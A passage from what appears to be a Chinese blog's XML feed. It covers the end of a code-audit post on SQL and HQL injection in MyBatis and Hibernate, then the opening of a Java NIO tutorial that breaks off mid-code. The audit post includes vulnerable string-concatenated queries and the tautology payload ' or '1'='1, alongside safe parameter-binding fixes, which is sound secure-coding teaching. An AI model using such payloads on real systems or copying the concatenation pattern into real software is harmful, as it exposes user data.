<code>#&#123;&#125;</code> 参数可以确保用户输入的数据安全。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserByCondition&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM users</span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;username != null&quot;</span>&gt;</span></span><br><span class="line">            AND username = #&#123;username&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;age != null&quot;</span>&gt;</span></span><br><span class="line">            AND age = #&#123;age&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="6-2-使用-sql-标签复用安全查询片段"><a href="#6-2-使用-sql-标签复用安全查询片段" class="headerlink" title="6.2 使用 sql 标签复用安全查询片段"></a>6.2 使用 <code>sql</code> 标签复用安全查询片段</h4><ul><li>MyBatis 支持将查询片段定义在 <code>&lt;sql&gt;</code> 标签中，避免开发者在多个位置拼接相似 SQL 语句，有助于规范化 SQL 查询结构，降低出错风险。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">&quot;userColumns&quot;</span>&gt;</span></span><br><span class="line">    id, username, age, email</span><br><span class="line"><span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.User&quot;</span>&gt;</span></span><br><span class="line">    SELECT <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;userColumns&quot;</span>/&gt;</span> FROM users WHERE id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="Hibernate-框架注入"><a href="#Hibernate-框架注入" class="headerlink" title="Hibernate 框架注入"></a><strong>Hibernate</strong> 框架注入</h2><h3 id="1-Hibernate-框架概述"><a href="#1-Hibernate-框架概述" class="headerlink" title="1. Hibernate 框架概述"></a>1. Hibernate 框架概述</h3><p>Hibernate 是一种持久层框架，实现了 Java 持久化 API（JPA）规范，用于在 Java 类和数据库表之间进行映射。Hibernate 允许开发者通过操作 Java 对象来与数据库交互，而无需编写原生 SQL 语句。Hibernate 主要通过 HQL 查询语言和 Criteria API 进行对象持久化，支持自动将 Java 数据类型映射到 SQL 数据类型。</p><p>Hibernate 需要一个配置文件（hibernate.cfg.xml），其中包含了数据库连接信息和一些基本的 Hibernate 设置。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">hibernate-configuration</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Hibernate/Hibernate Configuration DTD 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hibernate-configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-factory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.dialect&quot;</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.connection.driver_class&quot;</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.connection.url&quot;</span>&gt;</span>jdbc:mysql://localhost:3306/mydb<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.connection.username&quot;</span>&gt;</span>root<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.connection.password&quot;</span>&gt;</span>password<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.hbm2ddl.auto&quot;</span>&gt;</span>update<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.show_sql&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">session-factory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">hibernate-configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在 Hibernate 中，Java 类通常使用注解来表示实体，并将其与数据库表相关联。例如，以下是一个简单的 User 类及其数据库映射：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.persistence.Entity;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.GeneratedValue;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.GenerationType;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Id;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span> <span class="comment">// @Id 指定了主键。</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>  <span class="comment">// @GeneratedValue 配置了主键的生成策略。</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getters and setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hibernate 提供了 Session 对象，用于管理和操作实体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.hibernate.Session;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.SessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.cfg.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建 SessionFactory</span></span><br><span class="line">        <span class="type">SessionFactory</span> <span class="variable">sessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>().configure().buildSessionFactory();</span><br><span class="line">        <span class="comment">// 获取 Session</span></span><br><span class="line">        <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> sessionFactory.openSession();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 开启事务</span></span><br><span class="line">        session.beginTransaction();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建用户</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setUsername(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        user.setPassword(<span class="string">&quot;12345&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存用户到数据库</span></span><br><span class="line">        session.save(user);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 提交事务</span></span><br><span class="line">        session.getTransaction().commit();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭 Session</span></span><br><span class="line">        session.close();</span><br><span class="line">        sessionFactory.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hibernate 提供了 HQL（Hibernate Query Language）和 Criteria API 来查询数据库。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HQL查询</span></span><br><span class="line">List&lt;User&gt; users = session.createQuery(<span class="string">&quot;from User where username = :username&quot;</span>, User.class)</span><br><span class="line">                          .setParameter(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                          .getResultList();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Criteria 查询</span></span><br><span class="line"><span class="type">CriteriaBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> session.getCriteriaBuilder();</span><br><span class="line">CriteriaQuery&lt;User&gt; query = builder.createQuery(User.class);</span><br><span class="line">Root&lt;User&gt; root = query.from(User.class);</span><br><span class="line">query.select(root).where(builder.equal(root.get(<span class="string">&quot;username&quot;</span>), <span class="string">&quot;admin&quot;</span>));</span><br><span class="line">List&lt;User&gt; users = session.createQuery(query).getResultList();</span><br></pre></td></tr></table></figure><h3 id="2-HQL-与-SQL-注入"><a href="#2-HQL-与-SQL-注入" class="headerlink" title="2. HQL 与 SQL 注入"></a>2. HQL 与 SQL 注入</h3><h4 id="HQL-注入示例"><a href="#HQL-注入示例" class="headerlink" title="HQL 注入示例"></a>HQL 注入示例</h4><p>以下代码展示了不安全的 HQL 查询，开发者直接将用户输入拼接到查询语句中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">factory = <span class="keyword">new</span> <span class="title class_">Configuration</span>().configure().buildSessionFactory();</span><br><span class="line"><span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> factory.openSession();</span><br><span class="line"><span class="type">Transaction</span> <span class="variable">tx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    tx = session.beginTransaction();</span><br><span class="line">    <span class="type">String</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="string">&quot; zaaaa&#x27; or &#x27;1&#x27;=&#x27;1 &quot;</span>;</span><br><span class="line">    List&lt;User&gt; users = session.createQuery(<span class="string">&quot;FROM User WHERE name = &#x27;&quot;</span> + parameter + <span class="string">&quot;&#x27;&quot;</span>, User.class).getResultList();</span><br><span class="line">    <span class="keyword">for</span> (User user : users) &#123;</span><br><span class="line">        System.out.println(user.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    tx.commit();</span><br><span class="line">&#125; <span class="keyword">catch</span> (HibernateException e) &#123;</span><br><span class="line">    <span class="keyword">if</span> (tx != <span class="literal">null</span>) tx.rollback();</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    session.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>注入风险分析</strong>：<ul><li>变量 <code>parameter</code> 是用户输入的内容，当用户输入 <code>&quot;zaaaa&#39; or &#39;1&#39;=&#39;1&quot;</code> 时，最终拼接成的 HQL 语句为：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> <span class="keyword">User</span> <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;zaaaa&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure></li><li>因为 <code>OR &#39;1&#39;=&#39;1&#39;</code> 恒为真，查询将返回表中所有用户的记录。</li><li>此处，用户通过注入语句控制了查询的逻辑，可能导致数据泄露。</li></ul></li></ul><h3 id="3-预防-HQL-注入的参数绑定方式"><a href="#3-预防-HQL-注入的参数绑定方式" class="headerlink" title="3. 预防 HQL 注入的参数绑定方式"></a>3. 预防 HQL 注入的参数绑定方式</h3><p>在 Hibernate 中，安全的参数绑定方式包括位置参数、命名参数、命名参数列表和类实例。这些方法均采用预编译，确保参数化查询，有效防止 SQL 注入。</p><h4 id="3-1-位置参数（Positional-Parameter）"><a href="#3-1-位置参数（Positional-Parameter）" class="headerlink" title="3.1 位置参数（Positional Parameter）"></a>3.1 位置参数（Positional Parameter）</h4><p>位置参数通过 <code>?</code> 占位符指定参数位置，然后使用 <code>setParameter</code> 方法绑定参数值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="string">&quot;z1ng&quot;</span>;</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;FROM User WHERE name = ?1&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="number">1</span>, parameter);</span><br></pre></td></tr></table></figure><ul><li><strong>执行过程</strong>：<ul><li><code>?1</code> 表示第一个参数位置，在查询时将自动绑定 <code>parameter</code> 的值。</li><li>位置参数的预编译可以确保输入被当作数据处理，而不是查询语句的一部分，从而避免 SQL 注入。</li></ul></li></ul><h4 id="3-2-命名参数（Named-Parameter）"><a href="#3-2-命名参数（Named-Parameter）" class="headerlink" title="3.2 命名参数（Named Parameter）"></a>3.2 命名参数（Named Parameter）</h4><p>命名参数通过 <code>:parameterName</code> 格式指定参数名，并使用 <code>setParameter</code> 方法绑定具体值。相比位置参数，命名参数更具可读性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="string">&quot;z1ng&quot;</span>;</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;FROM User WHERE name = :name&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="string">&quot;name&quot;</span>, parameter);</span><br></pre></td></tr></table></figure><ul><li><strong>执行过程</strong>：<ul><li><code>:name</code> 为命名参数，占位符被替换为 <code>parameter</code> 的值。</li><li>Hibernate 会将 <code>parameter</code> 作为数据绑定到查询语句，不会影响查询逻辑。</li></ul></li></ul><h4 id="3-3-命名参数列表（Named-Parameter-List）"><a href="#3-3-命名参数列表（Named-Parameter-List）" class="headerlink" title="3.3 命名参数列表（Named Parameter List）"></a>3.3 命名参数列表（Named Parameter List）</h4><p>命名参数列表允许绑定集合或数组作为查询参数，适用于 IN 查询等多值场景。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; names = Arrays.asList(<span class="string">&quot;z1ng&quot;</span>, <span class="string">&quot;z2ng&quot;</span>);</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;FROM User WHERE name IN (:names)&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="string">&quot;names&quot;</span>, names);</span><br></pre></td></tr></table></figure><ul><li><strong>执行过程</strong>：<ul><li>Hibernate 会将 <code>names</code> 列表中每个元素作为独立参数绑定到查询，防止任何单一值干扰查询结构。</li></ul></li></ul><h4 id="3-4-类实例（JavaBean）"><a href="#3-4-类实例（JavaBean）" class="headerlink" title="3.4 类实例（JavaBean）"></a>3.4 类实例（JavaBean）</h4><p>通过类实例绑定参数，将对象的属性直接映射到查询参数中。可以使用 <code>setProperties</code> 方法批量绑定对象属性，避免逐个指定参数值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user1.setName(<span class="string">&quot;z1ng&quot;</span>);</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;FROM User WHERE name = :name&quot;</span>, User.class);</span><br><span class="line">query.setProperties(user1);</span><br></pre></td></tr></table></figure><ul><li><strong>执行过程</strong>：<ul><li>该方法会根据 <code>user1</code> 对象的属性自动绑定查询参数，确保查询安全。</li></ul></li></ul><h3 id="4-使用原生-SQL-的注意事项"><a href="#4-使用原生-SQL-的注意事项" class="headerlink" title="4. 使用原生 SQL 的注意事项"></a>4. 使用原生 SQL 的注意事项</h3><p>Hibernate 还支持直接执行原生 SQL 语句。当使用原生 SQL 时，拼接用户输入会导致和 JDBC 中相同的 SQL 注入风险。建议采用参数绑定方式执行原生 SQL 查询。</p><h4 id="不安全的原生-SQL-拼接示例"><a href="#不安全的原生-SQL-拼接示例" class="headerlink" title="不安全的原生 SQL 拼接示例"></a>不安全的原生 SQL 拼接示例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="string">&quot;z1ng&quot;</span>;</span><br><span class="line">Query&lt;User&gt; query = session.createNativeQuery(<span class="string">&quot;SELECT * FROM user WHERE name = &#x27;&quot;</span> + parameter + <span class="string">&quot;&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>注入风险</strong>：<ul><li>直接将 <code>parameter</code> 拼接到 SQL 语句中，恶意用户可以通过输入 <code>z1ng&#39; OR &#39;1&#39;=&#39;1</code> 改变查询逻辑。</li></ul></li></ul><h4 id="安全的原生-SQL-参数绑定"><a href="#安全的原生-SQL-参数绑定" class="headerlink" title="安全的原生 SQL 参数绑定"></a>安全的原生 SQL 参数绑定</h4><p>通过参数绑定，可以避免拼接用户输入带来的注入风险：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="string">&quot;z1ng&quot;</span>;</span><br><span class="line">Query&lt;User&gt; query = session.createNativeQuery(<span class="string">&quot;SELECT * FROM user WHERE name = :name&quot;</span>, User.class);</span><br><span class="line">query.setParameter(<span class="string">&quot;name&quot;</span>, parameter);</span><br></pre></td></tr></table></figure><ul><li><strong>执行过程</strong>：<ul><li>使用 <code>:name</code> 参数占位符，<code>parameter</code> 值将作为独立数据绑定，确保查询逻辑安全。</li></ul></li></ul><h3 id="5-其他安全建议"><a href="#5-其他安全建议" class="headerlink" title="5. 其他安全建议"></a>5. 其他安全建议</h3><h4 id="5-1-使用-Criteria-API"><a href="#5-1-使用-Criteria-API" class="headerlink" title="5.1 使用 Criteria API"></a>5.1 使用 Criteria API</h4><p>Hibernate 提供的 Criteria API 可以动态构建查询，避免手动拼接 SQL 或 HQL 语句，进而降低 SQL 注入的可能性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CriteriaBuilder</span> <span class="variable">cb</span> <span class="operator">=</span> session.getCriteriaBuilder();</span><br><span class="line">CriteriaQuery&lt;User&gt; cq = cb.createQuery(User.class);</span><br><span class="line">Root&lt;User&gt; root = cq.from(User.class);</span><br><span class="line">cq.select(root).where(cb.equal(root.get(<span class="string">&quot;name&quot;</span>), parameter));</span><br><span class="line">List&lt;User&gt; results = session.createQuery(cq).getResultList();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Java开发】Java NIO</title>
      <link href="/2024/11/04/code/javanio/"/>
      <url>/2024/11/04/code/javanio/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/11/04/code/javanio/image.png"></p><p>Java NIO（New Input&#x2F;Output）是Java 1.4中引入的一套新的I&#x2F;O API，旨在提供比传统Java I&#x2F;O更高效的I&#x2F;O操作。它通过非阻塞模式、通道（Channels）、缓冲区（Buffers）等机制，增强了Java处理高并发和大数据量时的性能，尤其适合需要高吞吐量的网络应用开发。</p><h2 id="1-Java-NIO-核心概念"><a href="#1-Java-NIO-核心概念" class="headerlink" title="1. Java NIO 核心概念"></a>1. <strong>Java NIO 核心概念</strong></h2><p>NIO（New I&#x2F;O）的设计目标是解决传统 I&#x2F;O（BIO，Blocking I&#x2F;O）在处理大量并发连接时的性能瓶颈。传统 I&#x2F;O 在网络通信中主要使用阻塞式 I&#x2F;O，为每个连接分配一个线程。当连接数量增加时，系统性能将受到严重影响，线程资源成为关键瓶颈。而 NIO 提供了非阻塞 I&#x2F;O 和 I&#x2F;O 多路复用，可以在单个线程中处理多个并发连接，从而在网络传输中显著提高性能。</p><ul><li><p><strong>Channel（通道）</strong>：NIO中的通道类似于传统I&#x2F;O中的“流”，但不同的是通道是双向的，可以用于读取、写入或者同时执行这两种操作。常见的通道类型包括<code>FileChannel</code>、<code>SocketChannel</code>、<code>ServerSocketChannel</code>、<code>DatagramChannel</code>等。</p></li><li><p><strong>Buffer（缓冲区）</strong>：缓冲区是NIO中用于存储数据的容器。与传统I&#x2F;O的直接读写数据不同，NIO通过先将数据写入缓冲区，再由缓冲区发送到通道，或从通道中读取数据放入缓冲区。这种机制使得数据可以被更有效地管理。常见的缓冲区有<code>ByteBuffer</code>、<code>CharBuffer</code>、<code>IntBuffer</code>等，支持多种基本数据类型。</p></li><li><p><strong>Selector（选择器）</strong>：选择器用于管理多个通道，允许单线程处理多个通道的事件（如连接请求、读写操作等），实现非阻塞I&#x2F;O的多路复用。它使得一个线程可以监听多个通道的状态（如读、写、连接等），从而避免了每个连接一个线程的资源开销。</p></li></ul><h2 id="2-主要特性"><a href="#2-主要特性" class="headerlink" title="2. 主要特性"></a>2. <strong>主要特性</strong></h2><ul><li><p><strong>非阻塞I&#x2F;O</strong>：传统I&#x2F;O是阻塞的，比如当执行<code>read()</code>时，程序会一直等待直到数据完全读取。而NIO允许非阻塞操作，线程在执行I&#x2F;O操作时无需等待，可以继续执行其他任务。这对于需要处理大量并发请求的服务器应用非常有用。</p></li><li><p><strong>多路复用</strong>：通过<code>Selector</code>，Java NIO支持单线程管理多个通道的连接请求，这种技术称为“多路复用”（Multiplexing）。相比传统的“一个请求一个线程”模式，NIO的多路复用可以显著减少线程开销。</p></li></ul><h2 id="3-Java-NIO-中的核心类和接口"><a href="#3-Java-NIO-中的核心类和接口" class="headerlink" title="3. Java NIO 中的核心类和接口"></a>3. <strong>Java NIO 中的核心类和接口</strong></h2><ul><li><p><strong>ByteBuffer</strong>：这是NIO中最常用的缓冲区类，主要用于字节存储。<code>ByteBuffer</code>支持直接缓冲区（Direct Buffer）和非直接缓冲区。直接缓冲区在Java堆外直接分配内存，与操作系统底层的I&#x2F;O操作更加接近，适合大数据的快速传输。</p></li><li><p><strong>FileChannel</strong>：用于文件的通道，通过<code>FileInputStream</code>、<code>FileOutputStream</code>、<code>RandomAccessFile</code>等获取。<code>FileChannel</code>可以从文件中读取数据或写入数据，还支持内存映射文件（MappedByteBuffer）等高效操作。</p></li><li><p><strong>SocketChannel、ServerSocketChannel、DatagramChannel</strong>：这些通道用于网络通信。<code>SocketChannel</code>可以用于TCP客户端，<code>ServerSocketChannel</code>用于TCP服务器，而<code>DatagramChannel</code>用于UDP通信。</p></li><li><p><strong>Selector</strong>：<code>Selector</code>通过<code>select()</code>方法监听多个通道的事件（如读、写、连接等），并返回已准备就绪的通道。这种机制极大地提高了服务器的并发性能。</p></li></ul><h2 id="4-Java-NIO-的操作流程"><a href="#4-Java-NIO-的操作流程" class="headerlink" title="4. Java NIO 的操作流程"></a>4. <strong>Java NIO 的操作流程</strong></h2><p>使用Java NIO进行非阻塞I&#x2F;O的流程通常如下：</p><ol><li><strong>创建通道</strong>：打开一个通道，例如<code>FileChannel</code>或<code>SocketChannel</code>。</li><li><strong>配置缓冲区</strong>：为通道创建一个或多个缓冲区，用于存储数据。</li><li><strong>写入或读取数据</strong>：将数据写入缓冲区或从缓冲区读取数据，通过通道传输。</li><li><strong>非阻塞模式与选择器</strong>：将通道配置为非阻塞模式，将通道注册到选择器上，通过选择器监听并处理多个通道的事件。</li><li><strong>事件处理</strong>：通过选择器的<code>select()</code>方法获取就绪的通道集合，根据不同事件执行相应的操作（读、写、连接等）。</li></ol><h2 id="5-代码示例"><a href="#5-代码示例" class="headerlink" title="5. 代码示例"></a>5. <strong>代码示例</strong></h2><p>以下是一个简单的NIO示例，展示如何使用<code>Selector</code>和<code>SocketChannel</code>处理非阻塞网络通信。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SelectionKey;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.Selector;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.ServerSocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NIOServerExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Selector</span> <span class="variable">selector</span> <span class="operator">=</span> Selector.open();  <span class="comment">// 创建选择器</span></span><br><span class="line">        <span 